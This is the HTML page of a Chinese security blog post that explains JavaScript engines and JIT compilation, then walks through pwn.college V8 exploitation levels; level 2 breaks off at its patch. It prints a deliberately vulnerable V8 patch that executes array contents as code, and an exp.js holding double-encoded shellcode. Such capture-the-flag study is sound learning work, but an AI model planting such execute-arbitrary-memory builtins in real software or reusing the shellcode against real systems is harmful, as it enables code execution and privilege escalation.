@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前段时间看到pwn比赛中有考察到js引擎的题目，本人打算学习了解一下。主打一个广涉猎，在每个方向的深度方面可能还需要在后续的做题过程中积累。。。。 什么是”引擎”？这里用引擎描述还是非常形象的，即将js代码“发动”起来（准确地给出代码运行结果的一段程序）的工具。我看到这段第一反应是：这不就是编译器吗？但是要注意，javascript是动态语言。对于动态语言来说，让其从源代码文件到可以跑起来的字节码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JS引擎">
+<meta property="og:url" content="http://example.com/2025/12/25/JS%E5%BC%95%E6%93%8E/index.html">
+<meta property="og:site_name" content="No_t1me&#39;s blog">
+<meta property="og:description" content="前段时间看到pwn比赛中有考察到js引擎的题目，本人打算学习了解一下。主打一个广涉猎，在每个方向的深度方面可能还需要在后续的做题过程中积累。。。。 什么是”引擎”？这里用引擎描述还是非常形象的，即将js代码“发动”起来（准确地给出代码运行结果的一段程序）的工具。我看到这段第一反应是：这不就是编译器吗？但是要注意，javascript是动态语言。对于动态语言来说，让其从源代码文件到可以跑起来的字节码">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/12/25/JS%E5%BC%95%E6%93%8E/3.png">
+<meta property="og:image" content="http://example.com/2025/12/25/JS%E5%BC%95%E6%93%8E/2.png">
+<meta property="article:published_time" content="2025-12-25T06:01:33.000Z">
+<meta property="article:modified_time" content="2026-01-21T08:09:36.559Z">
+<meta property="article:author" content="no_t1me">
+<meta property="article:tag" content="javascript，解释器">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/12/25/JS%E5%BC%95%E6%93%8E/3.png">
+
+
+<link rel="canonical" href="http://example.com/2025/12/25/JS%E5%BC%95%E6%93%8E/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/12/25/JS%E5%BC%95%E6%93%8E/","path":"2025/12/25/JS引擎/","title":"JS引擎"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>JS引擎 | No_t1me's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">No_t1me's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">lost in binary</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E2%80%9D%E5%BC%95%E6%93%8E%E2%80%9D%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">什么是”引擎”？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E6%93%8E%E7%9A%84%E7%BB%84%E6%88%90"><span class="nav-number">1.1.</span> <span class="nav-text">引擎的组成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%BD%A2%E5%BC%8F"><span class="nav-number">1.2.</span> <span class="nav-text">题目形式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwncollege-V8-exploitation"><span class="nav-number">2.</span> <span class="nav-text">pwncollege V8 exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level-1"><span class="nav-number">2.1.</span> <span class="nav-text">level 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-2"><span class="nav-number">2.2.</span> <span class="nav-text">level 2</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">no_t1me</p>
+  <div class="site-description" itemprop="description">逝者如斯夫，不舍昼夜</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/No-t1me" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;No-t1me" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:birty073@126.com" title="email → mailto:birty073@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>email</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          友情链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://ret2ldz.github.io/" title="https:&#x2F;&#x2F;ret2ldz.github.io" rel="noopener" target="_blank">ldz</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://www.jimmmmmiesblog.cn/" title="https:&#x2F;&#x2F;www.jimmmmmiesblog.cn" rel="noopener" target="_blank">Jimmy</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://aucept.in/" title="https:&#x2F;&#x2F;aucept.in" rel="noopener" target="_blank">Auceptin</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/25/JS%E5%BC%95%E6%93%8E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="no_t1me">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="No_t1me's blog">
+      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="JS引擎 | No_t1me's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JS引擎
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-12-25 14:01:33" itemprop="dateCreated datePublished" datetime="2025-12-25T14:01:33+08:00">2025-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-01-21 16:09:36" itemprop="dateModified" datetime="2026-01-21T16:09:36+08:00">2026-01-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>前段时间看到pwn比赛中有考察到js引擎的题目，本人打算学习了解一下。主打一个广涉猎，在每个方向的深度方面可能还需要在后续的做题过程中积累。。。。</p>
+<h2 id="什么是”引擎”？"><a href="#什么是”引擎”？" class="headerlink" title="什么是”引擎”？"></a>什么是”引擎”？</h2><p>这里用引擎描述还是非常形象的，即将js代码“发动”起来（准确地给出代码运行结果的一段程序）的工具。我看到这段第一反应是：这不就是编译器吗？但是要注意，javascript是动态语言。对于动态语言来说，让其从源代码文件到可以跑起来的字节码的工具叫做<strong>解释器（Interpreter）</strong></p>
+<p>区别：</p>
+<ul>
+<li><strong>编译器是将源代码编译为另外一种代码（比如机器码，或者字节码）</strong></li>
+<li><strong>解释器是直接解析并将代码运行结果输出</strong>。 比方说，firebug的console就是一个JavaScript的解释器。</li>
+</ul>
+<blockquote>
+<p>解释型语言：程序不需要编译，程序在运行的过程中才用解释器编译成机器语言，边编译边执行，不会产生可执行的字节码文件</p>
+<p>但是，现在很难去界定说，JavaScript引擎到底算是解释器还是编译器，因为，比如像<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=106846137&content_type=Article&match_order=1&q=V8&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjY4MTQ5NDYsInEiOiJWOCIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjEwNjg0NjEzNywiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.FDUBSVbzgqyjhxMYYx6_QdVq3z921mElAi3CnByOluE&zhida_source=entity">V8</a>（Chrome的JS引擎），它其实为了提高 JS的运行性能，在运行之前会先将JS编译为本地的机器码（native machine code），然后再去执行机器码（这样速度就快很多）</p>
+<p>JIT（Just In Time Compilation）：解决解释性语言的性能问题，主要思想是当解释器将源代码解释成内部表示的时候（类似于java字节码），JavaScript的执行环境不仅是解释这些内部表示，而且将其中一些字节码（使用率高的部分）转成本地代码（汇编代码），这样就可以被CPU直接执行，而不是解释执行，从而提高性能。</p>
+<p>工作流水线:<code>字节码 → 解释器执行 → 热点探测 → JIT 编译 → 本地代码缓存 → 后续直接跳转</code></p>
+</blockquote>
+<h3 id="引擎的组成"><a href="#引擎的组成" class="headerlink" title="引擎的组成"></a>引擎的组成</h3><ul>
+<li>编译器。主要工作是将源代码编译成抽象语法树，然后在某些引擎中还包含将抽象语法树转换成字节码</li>
+<li>解释器。在某些引擎中，解释器主要是接受字节码，解释执行这个字节码，然后也依赖回收机制等</li>
+<li>JIT工具。一个能够JIT的工具，将字节码或者抽象语法树转换成本地代码</li>
+<li>垃圾回收器和分析工具（profiler）。它们负责垃圾回收和收集引擎中的信息，帮助改善引擎的性能和功效</li>
+</ul>
+<h3 id="题目形式"><a href="#题目形式" class="headerlink" title="题目形式"></a>题目形式</h3><p>通常会在文件中给出特定的patch修改文件，同时给出已经运用该引擎的对应js引擎。作为攻击者，我们需要利用js代码利用patch的地方(通常存在漏洞)来达到提权的目的。创建exp.js，利用引擎解析该js文件，触发漏洞，提权&#x2F;获得flag</p>
+<h2 id="pwncollege-V8-exploitation"><a href="#pwncollege-V8-exploitation" class="headerlink" title="pwncollege V8 exploitation"></a>pwncollege V8 exploitation</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>第一步确定题目patch的地方，patch文件：</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index ea45a7ada6b..c840e568152 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -24,6 +24,8 @@</span></span><br><span class="line"> #include &quot;src/objects/prototype.h&quot;</span><br><span class="line"> #include &quot;src/objects/smi.h&quot;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+extern &quot;C&quot; void *mmap(void *, unsigned long, int, int, int, int);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> namespace v8 &#123;</span><br><span class="line"> namespace internal &#123;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -407,6 +409,47 @@</span> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));</span><br><span class="line"> &#125;</span><br><span class="line"> // 这里声明新增加的java原生方法：array.run()</span><br><span class="line"><span class="addition">+BUILTIN(ArrayRun) &#123;</span></span><br><span class="line"><span class="addition">+  HandleScope scope(isolate);</span></span><br><span class="line"><span class="addition">+  Factory *factory = isolate-&gt;factory();</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; receiver = args.receiver();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast&lt;JSArray&gt;(*receiver))) &#123;</span></span><br><span class="line"><span class="addition">+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">+      factory-&gt;NewStringFromAsciiChecked(&quot;Nope&quot;)));</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSArray&gt; array = Cast&lt;JSArray&gt;(receiver);</span></span><br><span class="line"><span class="addition">+  ElementsKind kind = array-&gt;GetElementsKind();		//获取数组元素</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (kind != PACKED_DOUBLE_ELEMENTS) &#123;</span></span><br><span class="line"><span class="addition">+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">+      factory-&gt;NewStringFromAsciiChecked(&quot;Need array of double numbers&quot;)));</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  uint32_t length = static_cast&lt;uint32_t&gt;(Object::NumberValue(array-&gt;length()));	//获取长度</span></span><br><span class="line"><span class="addition">+  if (sizeof(double) * (uint64_t)length &gt; 4096) &#123;</span></span><br><span class="line"><span class="addition">+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">+      factory-&gt;NewStringFromAsciiChecked(&quot;array too long&quot;)));</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  // mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span></span><br><span class="line"><span class="addition">+  double *mem = (double *)mmap(NULL, 4096, 7, 0x22, -1, 0);</span></span><br><span class="line"><span class="addition">+  if (mem == (double *)-1) &#123;</span></span><br><span class="line"><span class="addition">+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">+      factory-&gt;NewStringFromAsciiChecked(&quot;mmap failed&quot;)));</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Handle&lt;FixedDoubleArray&gt; elements(Cast&lt;FixedDoubleArray&gt;(array-&gt;elements()), isolate);</span></span><br><span class="line"><span class="addition">+  FOR_WITH_HANDLE_SCOPE(isolate, uint32_t, i = 0, i, i &lt; length, i++, &#123;</span></span><br><span class="line"><span class="addition">+    double x = elements-&gt;get_scalar(i);</span></span><br><span class="line"><span class="addition">+    mem[i] = x;</span></span><br><span class="line"><span class="addition">+  &#125;);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  ((void (*)())mem)();</span></span><br><span class="line"><span class="addition">+  return 0;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> namespace &#123;</span><br><span class="line"> </span><br><span class="line"> V8_WARN_UNUSED_RESULT Tagged&lt;Object&gt; GenericArrayPop(Isolate* isolate,</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span><br><span class="line"><span class="comment">index 48249695b7b..40a762c24c8 100644</span></span><br><span class="line"><span class="comment">--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -2533,6 +2533,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line"> </span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;at&quot;, Builtin::kArrayPrototypeAt, 1,</span><br><span class="line">                           true);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;run&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtin::kArrayRun, 0, false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;concat&quot;,</span><br><span class="line">                           Builtin::kArrayPrototypeConcat, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;copyWithin&quot;,</span><br><span class="line">     </span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 78cbf8874ed..4f3d885cca7 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -421,6 +421,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypePop, kDontAdaptArgumentsSentinel)                          \</span><br><span class="line">   /* ES6 #sec-array.prototype.push */                                          \</span><br><span class="line">   CPP(ArrayPush)                                                               \</span><br><span class="line"><span class="addition">+  CPP(ArrayRun)                                                                \</span></span><br><span class="line">   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">   /* ES6 #sec-array.prototype.shift */                                         \</span><br><span class="line">   CPP(ArrayShift)</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p><strong>V8 挂方法的“模板公式”</strong></p>
+<ol>
+<li>在 <code>builtins-definitions.h</code> 加<br> <code>CPP(YourBuiltin)</code></li>
+<li>在 <code>builtins-xxx.cc</code> 写实现<br> <code>BUILTIN(YourBuiltin) { ... }</code></li>
+<li>在 <code>bootstrapper.cc</code> 挂原型<br> <code>SimpleInstallFunction(isolate_, proto, &quot;js方法名&quot;, Builtin::kYourBuiltin, 参数个数, 是否adapt);</code></li>
+</ol>
+</blockquote>
+<p>这段patch其实就是为v8引擎新增了一个识别array.run()方法的功能，对应实现<code>ArrayRun</code>本质上申请一片rwx内存，将array内存的double类型值依次存入，其中会检查类型是否为double以及长度限制。然后直接跳到内存开始处执行。非常简单粗暴，思路也很简单，直接借助强大的python写double类型的shellcode，然后在js文件run对应的double类型的array，即可执行任意代码。</p>
+<p>这里存在一点需要注意的，在执行这段shellcode时， RUID!&#x3D;EUID&#x3D;&#x3D;root。</p>
+<p><img src="/2025/12/25/JS%E5%BC%95%E6%93%8E/3.png"></p>
+<p>这里如果直接execve(‘&#x2F;bin&#x2F;sh’)的话，在某些安全配置下，如果检测到其实时RUID !&#x3D; EUID（例如，从setuid程序启动），<strong>会主动丢弃特权，将EUID重置为RUID</strong>，这是一种安全保护。在题目环境下会导致权限丢失。那么稳妥的方法是直接执行能够得到flag的文件，刚好题目给了一个catflag文件，非常巧的是(其实是故意设计的)：catflag的关联组与EUID相同，那么直接执行即可。</p>
+<p><img src="/2025/12/25/JS%E5%BC%95%E6%93%8E/2.png"></p>
+<p>Exp.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">2.6774523096502052e+156</span>,</span><br><span class="line">    <span class="number">7.811264351351817e-304</span>,</span><br><span class="line">    <span class="number">5.9243877051804356e+169</span>,</span><br><span class="line">    <span class="number">8.19170178617048e-79</span>,</span><br><span class="line">    <span class="number">2.8157102738592843e+79</span>,</span><br><span class="line">    <span class="number">1.5438141419276312e-307</span>,</span><br><span class="line">    <span class="number">4.19309166e-316</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>依旧先看patch文件：</p>
+<p>patch</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">index facf0d86d79..6b31fe2c371 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8.cc</span></span><br><span class="line"><span class="meta">@@ -1283,6 +1283,64 @@</span> struct ModuleResolutionData &#123;</span><br><span class="line"> </span><br><span 